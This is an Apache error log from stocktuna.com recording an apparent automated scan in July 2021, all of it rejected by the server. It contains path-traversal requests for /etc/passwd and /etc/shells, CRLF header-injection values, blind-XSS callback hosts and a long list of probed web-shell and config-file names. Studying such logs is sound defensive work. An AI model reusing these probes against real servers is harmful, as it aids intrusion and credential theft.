[Wed Jul 07 00:39:03.563149 2021] [php7:error] [pid 1357] [client 20.62.91.188:64084] script '/var/www/html/stocktuna.com/xmlrpc.php' not found or unable to stat
[Wed Jul 07 15:49:48.895405 2021] [php7:error] [pid 7036] [client 47.240.32.173:59662] script '/var/www/html/stocktuna.com/wp-login.php' not found or unable to stat, referer: http://stocktuna.com/wp-login.php
[Wed Jul 07 15:49:48.905883 2021] [php7:error] [pid 9530] [client 47.240.32.173:59664] script '/var/www/html/stocktuna.com/wp-login.php' not found or unable to stat, referer: http://stocktuna.com/wp-login.php
[Wed Jul 07 15:49:48.923581 2021] [php7:error] [pid 7171] [client 47.240.32.173:59660] script '/var/www/html/stocktuna.com/wp-login.php' not found or unable to stat, referer: http://stocktuna.com/wp-login.php
[Wed Jul 07 23:37:07.543247 2021] [http:error] [pid 22979] [client 27.147.202.214:3931] AH02430: Response header 'Location' value of 'https://stocktuna.com/\n.example.com' contains invalid characters, aborting request
[Wed Jul 07 23:37:11.884472 2021] [php7:error] [pid 22997] [client 27.147.202.214:3923] script '/var/www/html/stocktuna.com/adminer-4.6.2-en.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:11.899808 2021] [php7:error] [pid 23004] [client 27.147.202.214:3914] script '/var/www/html/stocktuna.com/adminer-4.6.0.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:11.902741 2021] [php7:error] [pid 23007] [client 27.147.202.214:3913] script '/var/www/html/stocktuna.com/adminer-4.5.0-mysql.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:11.903430 2021] [php7:error] [pid 22999] [client 27.147.202.214:3898] script '/var/www/html/stocktuna.com/adminer-4.3.0.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:11.903979 2021] [php7:error] [pid 23001] [client 27.147.202.214:3903] script '/var/www/html/stocktuna.com/adminer-4.3.1-en.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:11.905058 2021] [php7:error] [pid 23000] [client 27.147.202.214:3904] script '/var/www/html/stocktuna.com/adminer-4.3.1-mysql-en.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:11.905577 2021] [php7:error] [pid 23010] [client 27.147.202.214:3907] script '/var/www/html/stocktuna.com/adminer-4.4.0-en.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:11.911705 2021] [php7:error] [pid 23005] [client 27.147.202.214:3905] script '/var/www/html/stocktuna.com/adminer-4.3.1-mysql.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:11.913825 2021] [php7:error] [pid 23006] [client 27.147.202.214:3910] script '/var/www/html/stocktuna.com/adminer-4.5.0.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:11.915639 2021] [php7:error] [pid 23002] [client 27.147.202.214:3894] script '/var/www/html/stocktuna.com/adminer-4.2.5.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:11.917908 2021] [php7:error] [pid 23008] [client 27.147.202.214:3922] script '/var/www/html/stocktuna.com/adminer-4.6.2.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:11.921027 2021] [php7:error] [pid 23009] [client 27.147.202.214:3918] script '/var/www/html/stocktuna.com/adminer-4.6.1.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:11.923617 2021] [php7:error] [pid 23011] [client 27.147.202.214:3916] script '/var/www/html/stocktuna.com/adminer-4.6.0-mysql-en.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:12.048122 2021] [php7:error] [pid 22991] [client 27.147.202.214:3925] script '/var/www/html/stocktuna.com/adminer-4.6.2-mysql.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:12.052000 2021] [php7:error] [pid 22994] [client 27.147.202.214:3921] script '/var/www/html/stocktuna.com/adminer-4.6.1-mysql.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:12.163678 2021] [php7:error] [pid 22920] [client 27.147.202.214:3908] script '/var/www/html/stocktuna.com/adminer-4.4.0-mysql-en.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:12.410184 2021] [php7:error] [pid 22982] [client 27.147.202.214:3924] script '/var/www/html/stocktuna.com/adminer-4.6.2-mysql-en.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:12.453119 2021] [php7:error] [pid 22731] [client 27.147.202.214:3900] script '/var/www/html/stocktuna.com/adminer-4.3.0-mysql-en.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:12.581144 2021] [php7:error] [pid 23014] [client 27.147.202.214:3897] script '/var/www/html/stocktuna.com/adminer-4.2.5-mysql.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:12.582240 2021] [php7:error] [pid 23015] [client 27.147.202.214:3912] script '/var/www/html/stocktuna.com/adminer-4.5.0-mysql-en.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:12.583408 2021] [php7:error] [pid 23016] [client 27.147.202.214:3893] script '/var/www/html/stocktuna.com/Adminer.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:12.601621 2021] [php7:error] [pid 23018] [client 27.147.202.214:3909] script '/var/www/html/stocktuna.com/adminer-4.4.0-mysql.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:12.604854 2021] [php7:error] [pid 23023] [client 27.147.202.214:3902] script '/var/www/html/stocktuna.com/adminer-4.3.1.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:12.608972 2021] [php7:error] [pid 23017] [client 27.147.202.214:3920] script '/var/www/html/stocktuna.com/adminer-4.6.1-mysql-en.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:12.614798 2021] [php7:error] [pid 23020] [client 27.147.202.214:3901] script '/var/www/html/stocktuna.com/adminer-4.3.0-mysql.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:12.621357 2021] [php7:error] [pid 23030] [client 27.147.202.214:3911] script '/var/www/html/stocktuna.com/adminer-4.5.0-en.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:12.622268 2021] [php7:error] [pid 23019] [client 27.147.202.214:3889] script '/var/www/html/stocktuna.com/_adminer.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:12.623689 2021] [php7:error] [pid 23024] [client 27.147.202.214:3890] script '/var/www/html/stocktuna.com/adminer.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:12.625574 2021] [php7:error] [pid 23025] [client 27.147.202.214:3917] script '/var/www/html/stocktuna.com/adminer-4.6.0-mysql.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:12.628653 2021] [php7:error] [pid 23029] [client 27.147.202.214:3896] script '/var/www/html/stocktuna.com/adminer-4.2.5-mysql-en.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:12.637459 2021] [php7:error] [pid 23021] [client 27.147.202.214:3906] script '/var/www/html/stocktuna.com/adminer-4.4.0.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:12.638289 2021] [php7:error] [pid 23033] [client 27.147.202.214:3915] script '/var/www/html/stocktuna.com/adminer-4.6.0-en.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:12.638478 2021] [php7:error] [pid 23032] [client 27.147.202.214:3899] script '/var/www/html/stocktuna.com/adminer-4.3.0-en.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:12.645706 2021] [php7:error] [pid 23027] [client 27.147.202.214:3891] script '/var/www/html/stocktuna.com/ad.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:12.645900 2021] [php7:error] [pid 23034] [client 27.147.202.214:3919] script '/var/www/html/stocktuna.com/adminer-4.6.1-en.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:12.663179 2021] [php7:error] [pid 23026] [client 27.147.202.214:3895] script '/var/www/html/stocktuna.com/adminer-4.2.5-en.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:12.691645 2021] [php7:error] [pid 22996] [client 27.147.202.214:3892] script '/var/www/html/stocktuna.com/ad.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:13.217187 2021] [php7:error] [pid 22986] [client 27.147.202.214:3937] script '/var/www/html/stocktuna.com/bitrix_server_test.php' not found or unable to stat
[Wed Jul 07 23:37:13.258414 2021] [core:error] [pid 23019] [client 27.147.202.214:3889] AH00126: Invalid URI in request GET /static/../../../../../../../../../../../etc/shells HTTP/1.1
[Wed Jul 07 23:37:13.823080 2021] [php7:error] [pid 23029] [client 27.147.202.214:3896] script '/var/www/html/stocktuna.com/opcache.php' not found or unable to stat
[Wed Jul 07 23:37:14.956613 2021] [php7:error] [pid 23002] [client 27.147.202.214:3894] script '/var/www/html/stocktuna.com/opcache.php' not found or unable to stat
[Wed Jul 07 23:37:15.273875 2021] [core:error] [pid 23014] [client 27.147.202.214:3897] AH00126: Invalid URI in request GET /%2e%2e/index.js HTTP/1.1
[Wed Jul 07 23:37:15.557041 2021] [core:error] [pid 23029] [client 27.147.202.214:3896] AH00126: Invalid URI in request GET /%2e%2e/debug.js HTTP/1.1
[Wed Jul 07 23:37:16.222694 2021] [core:error] [pid 23027] [client 27.147.202.214:3891] AH00126: Invalid URI in request GET /%2e%2e/release.js HTTP/1.1
[Wed Jul 07 23:37:22.220590 2021] [core:error] [pid 23022] [client 27.147.202.214:3886] AH00126: Invalid URI in request GET @uri1.hit55983769560534c.group.bxss.me/ HTTP/1.1
[Wed Jul 07 23:37:22.988979 2021] [authz_core:error] [pid 22997] [client 27.147.202.214:12661] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/server-status
[Wed Jul 07 23:37:23.827117 2021] [php7:error] [pid 23005] [client 27.147.202.214:12687] script '/var/www/html/stocktuna.com/coredumpcheck.php' not found or unable to stat
[Wed Jul 07 23:37:23.972407 2021] [core:error] [pid 23015] [client 27.147.202.214:12740] AH00126: Invalid URI in request GET .uri3.hit55983769560534c.group.bxss.me/ HTTP/1.1
[Wed Jul 07 23:37:24.187480 2021] [http:error] [pid 23008] [client 27.147.202.214:12678] AH02430: Response header 'Location' value of 'https://stocktuna.com/\r\nheadername: headervalue' contains invalid characters, aborting request
[Wed Jul 07 23:37:25.636681 2021] [php7:error] [pid 23036] [client 27.147.202.214:12705] script '/var/www/html/stocktuna.com/loader-wizard.php' not found or unable to stat
[Wed Jul 07 23:37:25.643273 2021] [http:error] [pid 23030] [client 27.147.202.214:12795] AH02430: Response header 'Location' value of 'https://stocktuna.com/\r\theadername: headervalue' contains invalid characters, aborting request
[Wed Jul 07 23:37:26.651798 2021] [http:error] [pid 22983] [client 27.147.202.214:12837] AH02430: Response header 'Location' value of 'https://stocktuna.com/\nheadername: headervalue' contains invalid characters, aborting request
[Wed Jul 07 23:37:29.106862 2021] [http:error] [pid 23028] [client 27.147.202.214:12896] AH02430: Response header 'Location' value of 'https://stocktuna.com/\rheadername: headervalue' contains invalid characters, aborting request
[Wed Jul 07 23:37:30.803239 2021] [http:error] [pid 22991] [client 27.147.202.214:5284] AH02430: Response header 'Location' value of 'https://stocktuna.com/~\r\nheadername: headervalue' contains invalid characters, aborting request
[Wed Jul 07 23:37:32.821723 2021] [core:error] [pid 23010] [client 27.147.202.214:12676] AH00126: Invalid URI in request GET @bxss.me/rpb.png HTTP/1.1
[Wed Jul 07 23:37:33.509264 2021] [authz_core:error] [pid 22996] [client 27.147.202.214:9439] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/server-status
[Wed Jul 07 23:37:34.261409 2021] [core:error] [pid 23035] [client 27.147.202.214:9437] AH00126: Invalid URI in request GET /sdk/../../../../../../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 23:37:35.293942 2021] [php7:error] [pid 23005] [client 27.147.202.214:5935] script '/var/www/html/stocktuna.com/hykvalt8qq7z.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:37:35.454769 2021] [core:error] [pid 22982] [client 27.147.202.214:5922] AH00126: Invalid URI in request GET /../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Wed Jul 07 23:38:02.384978 2021] [php7:error] [pid 22870] [client 27.147.202.214:7768] script '/var/www/html/stocktuna.com/assets/r4d54gei5eit.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:38:02.734304 2021] [core:error] [pid 22873] [client 27.147.202.214:7754] AH00126: Invalid URI in request GET /assets/../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Wed Jul 07 23:38:03.326454 2021] [php7:error] [pid 23043] [client 27.147.202.214:7775] script '/var/www/html/stocktuna.com/assets/js/jlo56lsojtzg.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:38:03.653372 2021] [php7:error] [pid 23005] [client 27.147.202.214:7772] script '/var/www/html/stocktuna.com/FtCnTklf.php' not found or unable to stat
[Wed Jul 07 23:38:03.861194 2021] [php7:error] [pid 23019] [client 27.147.202.214:7785] script '/var/www/html/stocktuna.com/app_dev.php' not found or unable to stat
[Wed Jul 07 23:38:03.934874 2021] [php7:error] [pid 22985] [client 27.147.202.214:7779] script '/var/www/html/stocktuna.com/db.php' not found or unable to stat
[Wed Jul 07 23:38:04.147985 2021] [php7:error] [pid 23019] [client 27.147.202.214:7785] script '/var/www/html/stocktuna.com/xmlrpc.php' not found or unable to stat
[Wed Jul 07 23:38:04.167718 2021] [php7:error] [pid 23071] [client 27.147.202.214:7914] script '/var/www/html/stocktuna.com/assets/css/afezcnpxcm8e.php' not found or unable to stat, referer: https://stocktuna.com/
[Wed Jul 07 23:38:04.494454 2021] [php7:error] [pid 22808] [client 27.147.202.214:7792] script '/var/www/html/stocktuna.com/conf.php' not found or unable to stat
[Wed Jul 07 23:38:04.740312 2021] [php7:error] [pid 23069] [client 27.147.202.214:7913] script '/var/www/html/stocktuna.com/xmlrpc.php' not found or unable to stat
[Wed Jul 07 23:38:05.066270 2021] [php7:error] [pid 22808] [client 27.147.202.214:7792] script '/var/www/html/stocktuna.com/settings.php' not found or unable to stat
[Wed Jul 07 23:38:05.455506 2021] [php7:error] [pid 22832] [client 27.147.202.214:7776] script '/var/www/html/stocktuna.com/assets/js/apc.php' not found or unable to stat
[Wed Jul 07 23:38:05.643569 2021] [php7:error] [pid 22808] [client 27.147.202.214:7792] script '/var/www/html/stocktuna.com/config.php' not found or unable to stat
[Wed Jul 07 23:38:07.596858 2021] [php7:error] [pid 23069] [client 27.147.202.214:7913] script '/var/www/html/stocktuna.com/config.inc.php' not found or unable to stat
[Wed Jul 07 23:38:07.903999 2021] [php7:error] [pid 23070] [client 27.147.202.214:7916] script '/var/www/html/stocktuna.com/localconfig.php' not found or unable to stat
[Wed Jul 07 23:38:07.911189 2021] [authz_core:error] [pid 23005] [client 27.147.202.214:7772] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/js/.htaccess
[Wed Jul 07 23:38:09.263989 2021] [php7:error] [pid 23019] [client 27.147.202.214:7785] script '/var/www/html/stocktuna.com/assets/js/phpinfo.php' not found or unable to stat
[Wed Jul 07 23:38:09.681103 2021] [php7:error] [pid 23071] [client 27.147.202.214:7914] script '/var/www/html/stocktuna.com/xmlrpc.php' not found or unable to stat
[Wed Jul 07 23:38:10.537049 2021] [php7:error] [pid 22808] [client 27.147.202.214:7792] script '/var/www/html/stocktuna.com/configuration.php' not found or unable to stat
[Wed Jul 07 23:38:10.540634 2021] [php7:error] [pid 23071] [client 27.147.202.214:7914] script '/var/www/html/stocktuna.com/xmlrpc.php' not found or unable to stat
[Wed Jul 07 23:38:11.417743 2021] [php7:error] [pid 23065] [client 27.147.202.214:7773] script '/var/www/html/stocktuna.com/xmlrpc.php' not found or unable to stat
[Wed Jul 07 23:38:11.648181 2021] [php7:error] [pid 23005] [client 27.147.202.214:7772] script '/var/www/html/stocktuna.com/assets/js/r57shell.php' not found or unable to stat
[Wed Jul 07 23:38:11.648613 2021] [php7:error] [pid 22989] [client 27.147.202.214:7774] script '/var/www/html/stocktuna.com/assets/js/webadmin.php' not found or unable to stat
[Wed Jul 07 23:38:11.688929 2021] [php7:error] [pid 23070] [client 27.147.202.214:7916] script '/var/www/html/stocktuna.com/xmlrpc.php' not found or unable to stat
[Wed Jul 07 23:38:11.926357 2021] [php7:error] [pid 23005] [client 27.147.202.214:7772] script '/var/www/html/stocktuna.com/assets/js/r57.php' not found or unable to stat
[Wed Jul 07 23:38:12.188436 2021] [php7:error] [pid 22808] [client 27.147.202.214:7792] script '/var/www/html/stocktuna.com/settings.inc.php' not found or unable to stat
[Wed Jul 07 23:38:12.204307 2021] [php7:error] [pid 23005] [client 27.147.202.214:7772] script '/var/www/html/stocktuna.com/assets/js/r58.php' not found or unable to stat
[Wed Jul 07 23:38:12.263303 2021] [php7:error] [pid 23071] [client 27.147.202.214:7914] script '/var/www/html/stocktuna.com/apc.php' not found or unable to stat
[Wed Jul 07 23:38:12.291925 2021] [php7:error] [pid 23070] [client 27.147.202.214:7916] script '/var/www/html/stocktuna.com/xmlrpc.php' not found or unable to stat
[Wed Jul 07 23:38:12.476826 2021] [php7:error] [pid 22808] [client 27.147.202.214:7792] script '/var/www/html/stocktuna.com/global.inc.php' not found or unable to stat
[Wed Jul 07 23:38:12.482797 2021] [php7:error] [pid 23005] [client 27.147.202.214:7772] script '/var/www/html/stocktuna.com/assets/js/c99shell.php' not found or unable to stat
[Wed Jul 07 23:38:12.597997 2021] [php7:error] [pid 23019] [client 27.147.202.214:7785] script '/var/www/html/stocktuna.com/assets/js/pi.php' not found or unable to stat
[Wed Jul 07 23:38:12.760458 2021] [php7:error] [pid 23005] [client 27.147.202.214:7772] script '/var/www/html/stocktuna.com/assets/js/c99.php' not found or unable to stat
[Wed Jul 07 23:38:12.763048 2021] [php7:error] [pid 22808] [client 27.147.202.214:7792] script '/var/www/html/stocktuna.com/database.php' not found or unable to stat
[Wed Jul 07 23:38:12.904086 2021] [php7:error] [pid 23070] [client 27.147.202.214:7916] script '/var/www/html/stocktuna.com/soap.php' not found or unable to stat
[Wed Jul 07 23:38:13.038274 2021] [php7:error] [pid 23005] [client 27.147.202.214:7772] script '/var/www/html/stocktuna.com/assets/js/nstview.php' not found or unable to stat
[Wed Jul 07 23:38:13.155923 2021] [php7:error] [pid 23022] [client 27.147.202.214:7769] script '/var/www/html/stocktuna.com/assets/js/php.php' not found or unable to stat
[Wed Jul 07 23:38:13.308616 2021] [php7:error] [pid 23043] [client 27.147.202.214:7775] script '/var/www/html/stocktuna.com/phpThumb.php' not found or unable to stat
[Wed Jul 07 23:38:13.318154 2021] [php7:error] [pid 23005] [client 27.147.202.214:7772] script '/var/www/html/stocktuna.com/assets/js/nst.php' not found or unable to stat
[Wed Jul 07 23:38:13.339286 2021] [php7:error] [pid 22808] [client 27.147.202.214:7792] script '/var/www/html/stocktuna.com/database.inc.php' not found or unable to stat
[Wed Jul 07 23:38:13.445772 2021] [php7:error] [pid 23022] [client 27.147.202.214:7769] script '/var/www/html/stocktuna.com/assets/js/i.php' not found or unable to stat
[Wed Jul 07 23:38:13.512046 2021] [php7:error] [pid 23070] [client 27.147.202.214:7916] script '/var/www/html/stocktuna.com/soap.php' not found or unable to stat
[Wed Jul 07 23:38:13.595916 2021] [php7:error] [pid 23005] [client 27.147.202.214:7772] script '/var/www/html/stocktuna.com/assets/js/rst.php' not found or unable to stat
[Wed Jul 07 23:38:13.738949 2021] [php7:error] [pid 23022] [client 27.147.202.214:7769] script '/var/www/html/stocktuna.com/assets/js/test.php' not found or unable to stat
[Wed Jul 07 23:38:13.872962 2021] [php7:error] [pid 23005] [client 27.147.202.214:7772] script '/var/www/html/stocktuna.com/assets/js/r57eng.php' not found or unable to stat
[Wed Jul 07 23:38:14.031381 2021] [php7:error] [pid 23022] [client 27.147.202.214:7769] script '/var/www/html/stocktuna.com/assets/js/temp.php' not found or unable to stat
[Wed Jul 07 23:38:14.104665 2021] [php7:error] [pid 23070] [client 27.147.202.214:7916] script '/var/www/html/stocktuna.com/soap.php' not found or unable to stat
[Wed Jul 07 23:38:14.163305 2021] [php7:error] [pid 23005] [client 27.147.202.214:7772] script '/var/www/html/stocktuna.com/assets/js/shell.php' not found or unable to stat
[Wed Jul 07 23:38:14.444267 2021] [php7:error] [pid 23022] [client 27.147.202.214:7769] script '/var/www/html/stocktuna.com/assets/js/info.php' not found or unable to stat
[Wed Jul 07 23:38:14.451005 2021] [php7:error] [pid 22985] [client 27.147.202.214:7779] script '/var/www/html/stocktuna.com/assets/js/dra.php' not found or unable to stat
[Wed Jul 07 23:38:14.562527 2021] [authz_core:error] [pid 23077] [client 27.147.202.214:5833] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/.htaccess
[Wed Jul 07 23:38:14.741890 2021] [php7:error] [pid 22870] [client 27.147.202.214:7768] script '/var/www/html/stocktuna.com/soap.php' not found or unable to stat
[Wed Jul 07 23:38:14.742521 2021] [php7:error] [pid 22985] [client 27.147.202.214:7779] script '/var/www/html/stocktuna.com/assets/js/r.php' not found or unable to stat
[Wed Jul 07 23:38:15.045355 2021] [php7:error] [pid 22985] [client 27.147.202.214:7779] script '/var/www/html/stocktuna.com/assets/js/lol.php' not found or unable to stat
[Wed Jul 07 23:38:15.146889 2021] [php7:error] [pid 23077] [client 27.147.202.214:5833] script '/var/www/html/stocktuna.com/phpinfo.php' not found or unable to stat
[Wed Jul 07 23:38:15.329985 2021] [php7:error] [pid 22985] [client 27.147.202.214:7779] script '/var/www/html/stocktuna.com/assets/js/zehir.php' not found or unable to stat
[Wed Jul 07 23:38:15.361391 2021] [php7:error] [pid 23022] [client 27.147.202.214:7769] script '/var/www/html/stocktuna.com/xmlrpc-server.php' not found or unable to stat
[Wed Jul 07 23:38:15.611105 2021] [php7:error] [pid 22985] [client 27.147.202.214:7779] script '/var/www/html/stocktuna.com/assets/js/c-h.v2.php' not found or unable to stat
[Wed Jul 07 23:38:15.648739 2021] [php7:error] [pid 23065] [client 27.147.202.214:7773] script '/var/www/html/stocktuna.com/r57shell.php' not found or unable to stat
[Wed Jul 07 23:38:15.681276 2021] [php7:error] [pid 22870] [client 27.147.202.214:7768] script '/var/www/html/stocktuna.com/webadmin.php' not found or unable to stat
[Wed Jul 07 23:38:15.720600 2021] [php7:error] [pid 23077] [client 27.147.202.214:5833] script '/var/www/html/stocktuna.com/pi.php' not found or unable to stat
[Wed Jul 07 23:38:16.257195 2021] [php7:error] [pid 22985] [client 27.147.202.214:7779] script '/var/www/html/stocktuna.com/assets/js/php-backdoor.php' not found or unable to stat
[Wed Jul 07 23:38:16.706397 2021] [php7:error] [pid 23019] [client 27.147.202.214:7785] script '/var/www/html/stocktuna.com/assets/css/apc.php' not found or unable to stat
[Wed Jul 07 23:38:17.146788 2021] [php7:error] [pid 23022] [client 27.147.202.214:7769] script '/var/www/html/stocktuna.com/xmlrpc-server.php' not found or unable to stat
[Wed Jul 07 23:38:17.172655 2021] [php7:error] [pid 23065] [client 27.147.202.214:7773] script '/var/www/html/stocktuna.com/r57.php' not found or unable to stat
[Wed Jul 07 23:38:17.578483 2021] [php7:error] [pid 23065] [client 27.147.202.214:7773] script '/var/www/html/stocktuna.com/r58.php' not found or unable to stat
[Wed Jul 07 23:38:17.815660 2021] [php7:error] [pid 22985] [client 27.147.202.214:7779] script '/var/www/html/stocktuna.com/assets/js/simple-backdoor.php' not found or unable to stat
[Wed Jul 07 23:38:17.861045 2021] [php7:error] [pid 23077] [client 27.147.202.214:5833] script '/var/www/html/stocktuna.com/php.php' not found or unable to stat
[Wed Jul 07 23:38:17.866937 2021] [php7:error] [pid 23065] [client 27.147.202.214:7773] script '/var/www/html/stocktuna.com/c99shell.php' not found or unable to stat
[Wed Jul 07 23:38:17.869363 2021] [php7:error] [pid 22870] [client 27.147.202.214:7768] script '/var/www/html/stocktuna.com/xmlrpc-server.php' not found or unable to stat
[Wed Jul 07 23:38:18.763526 2021] [php7:error] [pid 23065] [client 27.147.202.214:7773] script '/var/www/html/stocktuna.com/c99.php' not found or unable to stat
[Wed Jul 07 23:38:19.167987 2021] [php7:error] [pid 23069] [client 27.147.202.214:7913] script '/var/www/html/stocktuna.com/xmlrpc-server.php' not found or unable to stat
[Wed Jul 07 23:38:19.582202 2021] [authz_core:error] [pid 23007] [client 27.147.202.214:5885] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/css/.htaccess
[Wed Jul 07 23:38:19.582488 2021] [php7:error] [pid 23064] [client 27.147.202.214:7771] script '/var/www/html/stocktuna.com/i.php' not found or unable to stat
[Wed Jul 07 23:38:20.003614 2021] [php7:error] [pid 23065] [client 27.147.202.214:7773] script '/var/www/html/stocktuna.com/nstview.php' not found or unable to stat
[Wed Jul 07 23:38:20.009002 2021] [php7:error] [pid 23064] [client 27.147.202.214:7771] script '/var/www/html/stocktuna.com/test.php' not found or unable to stat
[Wed Jul 07 23:38:20.441290 2021] [php7:error] [pid 23005] [client 27.147.202.214:7772] script '/var/www/html/stocktuna.com/xmlrpc_server.php' not found or unable to stat
[Wed Jul 07 23:38:20.442446 2021] [php7:error] [pid 22985] [client 27.147.202.214:7779] script '/var/www/html/stocktuna.com/nst.php' not found or unable to stat
[Wed Jul 07 23:38:20.444243 2021] [php7:error] [pid 23065] [client 27.147.202.214:7773] script '/var/www/html/stocktuna.com/assets/css/phpinfo.php' not found or unable to stat
[Wed Jul 07 23:38:20.870337 2021] [php7:error] [pid 23014] [client 27.147.202.214:7784] script '/var/www/html/stocktuna.com/rst.php' not found or unable to stat
[Wed Jul 07 23:38:20.871978 2021] [php7:error] [pid 23022] [client 27.147.202.214:7769] script '/var/www/html/stocktuna.com/assets/css/r57shell.php' not found or unable to stat
[Wed Jul 07 23:38:20.873148 2021] [php7:error] [pid 22989] [client 27.147.202.214:7774] script '/var/www/html/stocktuna.com/assets/css/webadmin.php' not found or unable to stat
[Wed Jul 07 23:38:21.302194 2021] [php7:error] [pid 23064] [client 27.147.202.214:7771] script '/var/www/html/stocktuna.com/temp.php' not found or unable to stat
[Wed Jul 07 23:38:21.307379 2021] [php7:error] [pid 23021] [client 27.147.202.214:7783] script '/var/www/html/stocktuna.com/assets/css/pi.php' not found or unable to stat
[Wed Jul 07 23:38:21.312329 2021] [php7:error] [pid 23043] [client 27.147.202.214:7775] script '/var/www/html/stocktuna.com/r57eng.php' not found or unable to stat
[Wed Jul 07 23:38:21.314417 2021] [php7:error] [pid 23022] [client 27.147.202.214:7769] script '/var/www/html/stocktuna.com/assets/css/r57.php' not found or unable to stat
[Wed Jul 07 23:38:21.578736 2021] [php7:error] [pid 23005] [client 27.147.202.214:7772] script '/var/www/html/stocktuna.com/xmlrpc_server.php' not found or unable to stat
[Wed Jul 07 23:38:21.601709 2021] [php7:error] [pid 23064] [client 27.147.202.214:7771] script '/var/www/html/stocktuna.com/info.php' not found or unable to stat
[Wed Jul 07 23:38:21.602467 2021] [php7:error] [pid 23043] [client 27.147.202.214:7775] script '/var/www/html/stocktuna.com/shell.php' not found or unable to stat
[Wed Jul 07 23:38:21.604303 2021] [php7:error] [pid 23022] [client 27.147.202.214:7769] script '/var/www/html/stocktuna.com/assets/css/r58.php' not found or unable to stat
[Wed Jul 07 23:38:21.874149 2021] [php7:error] [pid 22985] [client 27.147.202.214:7779] script '/var/www/html/stocktuna.com/assets/css/php.php' not found or unable to stat
[Wed Jul 07 23:38:21.891158 2021] [php7:error] [pid 23043] [client 27.147.202.214:7775] script '/var/www/html/stocktuna.com/dra.php' not found or unable to stat
[Wed Jul 07 23:38:21.894177 2021] [php7:error] [pid 23022] [client 27.147.202.214:7769] script '/var/www/html/stocktuna.com/assets/css/c99shell.php' not found or unable to stat
[Wed Jul 07 23:38:21.933315 2021] [php7:error] [pid 22870] [client 27.147.202.214:7768] script '/var/www/html/stocktuna.com/assets/apc.php' not found or unable to stat
[Wed Jul 07 23:38:22.155655 2021] [php7:error] [pid 22985] [client 27.147.202.214:7779] script '/var/www/html/stocktuna.com/assets/css/i.php' not found or unable to stat
[Wed Jul 07 23:38:22.171070 2021] [php7:error] [pid 23019] [client 27.147.202.214:7785] script '/var/www/html/stocktuna.com/xmlrpc_server.php' not found or unable to stat
[Wed Jul 07 23:38:22.179709 2021] [authz_core:error] [pid 23002] [client 27.147.202.214:5878] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/.htaccess
[Wed Jul 07 23:38:22.180226 2021] [php7:error] [pid 23043] [client 27.147.202.214:7775] script '/var/www/html/stocktuna.com/r.php' not found or unable to stat
[Wed Jul 07 23:38:22.184255 2021] [php7:error] [pid 23022] [client 27.147.202.214:7769] script '/var/www/html/stocktuna.com/assets/css/c99.php' not found or unable to stat
[Wed Jul 07 23:38:22.439828 2021] [php7:error] [pid 22985] [client 27.147.202.214:7779] script '/var/www/html/stocktuna.com/assets/css/test.php' not found or unable to stat
[Wed Jul 07 23:38:22.474210 2021] [php7:error] [pid 23043] [client 27.147.202.214:7775] script '/var/www/html/stocktuna.com/lol.php' not found or unable to stat
[Wed Jul 07 23:38:22.474273 2021] [php7:error] [pid 23022] [client 27.147.202.214:7769] script '/var/www/html/stocktuna.com/assets/css/nstview.php' not found or unable to stat
[Wed Jul 07 23:38:22.721348 2021] [php7:error] [pid 22985] [client 27.147.202.214:7779] script '/var/www/html/stocktuna.com/assets/css/temp.php' not found or unable to stat
